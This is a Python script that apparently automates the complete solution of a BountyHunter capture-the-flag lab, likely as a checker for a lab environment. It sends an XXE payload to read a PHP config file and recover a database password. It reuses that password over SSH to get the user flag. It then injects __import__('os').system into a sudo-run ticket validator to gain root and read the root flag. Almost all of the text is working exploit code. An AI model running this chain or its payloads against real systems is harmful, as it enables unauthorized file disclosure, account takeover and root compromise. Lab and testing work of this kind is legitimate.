#!/usr/bin/env python3
"""Independent HTTP/SSH attacker for the authentic BountyHunter XXE -> sudo eval chain."""
import base64
import html
import os
import re
import subprocess
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://bountyhunter-target").rstrip("/")
HOST = urllib.parse.urlsplit(BASE).hostname
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=10) as response:
        return response.status, html.unescape(response.read().decode("utf-8", "replace"))


def submit(xml):
    encoded = base64.b64encode(xml.encode("utf-8")).decode("ascii")
    data = urllib.parse.urlencode({"data": encoded}).encode()
    request = urllib.request.Request(BASE + "/tracker_diRbPr00f314.php", data=data)
    with urllib.request.urlopen(request, timeout=12) as response:
        return response.status, html.unescape(response.read().decode("utf-8", "replace"))


def ssh(password, command, input_text=None, timeout=20):
    args = [
        "sshpass", "-p", password, "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "ConnectTimeout=8",
        f"development@{HOST}", command,
    ]
    return subprocess.run(args, input=input_text, text=True, capture_output=True, timeout=timeout)


status, home = get("/")
assert status == 200 and "BOUNTY HUNTERS" in home
status, portal = get("/portal.php")
assert status == 200 and "under development" in portal and "/log_submit.php" in portal
status, form = get("/log_submit.php")
assert status == 200 and "Bounty Report System - Beta" in form
assert 'id="exploitTitle"' in form and "/resources/bountylog.js" in form
status, js = get("/resources/bountylog.js")
assert status == 200 and "tracker_diRbPr00f314.php" in js
status, readme = get("/resources/README.txt")
assert status == 200 and "Disable 'test' account" in readme
print("PASS: public site -> portal -> beta report form -> XML tracker discovery", flush=True)

normal_xml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    "<bugreport><title>First Report</title><cwe>CWE-79</cwe>"
    "<cvss>6.5</cvss><reward>250</reward></bugreport>"
)
status, confirmation = submit(normal_xml)
assert status == 200 and "If DB were ready, would have added:" in confirmation
assert "First Report" in confirmation and "CWE-79" in confirmation
print("PASS: real PHP SimpleXML handles normal base64 XML submission", flush=True)

xxe = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bugreport [<!ENTITY db SYSTEM '
    '"file:///var/www/localhost/htdocs/db.php">]>'
    "<bugreport><title>Portal Diagnostic</title><cwe>CWE-611</cwe>"
    "<cvss>6.5</cvss><reward>&db;</reward></bugreport>"
)
status, disclosure = submit(xxe)
assert status == 200 and "$dbpassword" in disclosure, disclosure[:1200]
match = re.search(r'\$dbpassword\s*=\s*"([^"]+)"', disclosure)
assert match, "XXE response did not expose the development credential"
password = match.group(1)
print("PASS: real libxml XXE reads the PHP config and recovers the reused development credential", flush=True)

status, public_db = get("/db.php")
assert status == 200 and public_db.strip() == ""
print("PASS: normal PHP route does not reveal the source directly", flush=True)

user_result = ssh(password, "id -un; id; cat /home/development/user.txt")
assert user_result.returncode == 0, user_result.stderr
assert "development" in user_result.stdout and "uid=1000(development)" in user_result.stdout
assert EXPECTED_USER_FLAG in user_result.stdout, "Exact per-instance User Flag mismatch"
sudo_result = ssh(password, "sudo -n -l")
assert sudo_result.returncode == 0 and "ticketValidator.py" in sudo_result.stdout
print("PASS: recovered credential authenticates over SSH and retrieves exact User Flag", flush=True)

ticket = (
    "# Skytrain Inc\n"
    "## Ticket to QA\n"
    "__Ticket Code:__\n"
    "**32+__import__('os').system('id > /tmp/bountyhunter-root-proof; "
    "cat /root/root.txt > /tmp/bountyhunter-root-flag-proof')+1000\n"
)
command = (
    "cat > /tmp/ci-skytrain.md && "
    "printf '/tmp/ci-skytrain.md\\n' | "
    "sudo -n /usr/bin/python3 /opt/skytrain_inc/ticketValidator.py"
)
ticket_result = ssh(password, command, input_text=ticket, timeout=30)
assert ticket_result.returncode == 0 and "Valid ticket." in ticket_result.stdout, (
    ticket_result.stdout, ticket_result.stderr
)
proof = ssh(
    password,
    "id -un; cat /tmp/bountyhunter-root-proof; cat /tmp/bountyhunter-root-flag-proof",
)
assert proof.returncode == 0 and "development" in proof.stdout and "uid=0(root)" in proof.stdout, proof.stdout
assert EXPECTED_ROOT_FLAG in proof.stdout, "Exact per-instance Root Flag mismatch"
print("PASS: real Skytrain Python eval executes as UID 0 and returns exact Root Flag", flush=True)
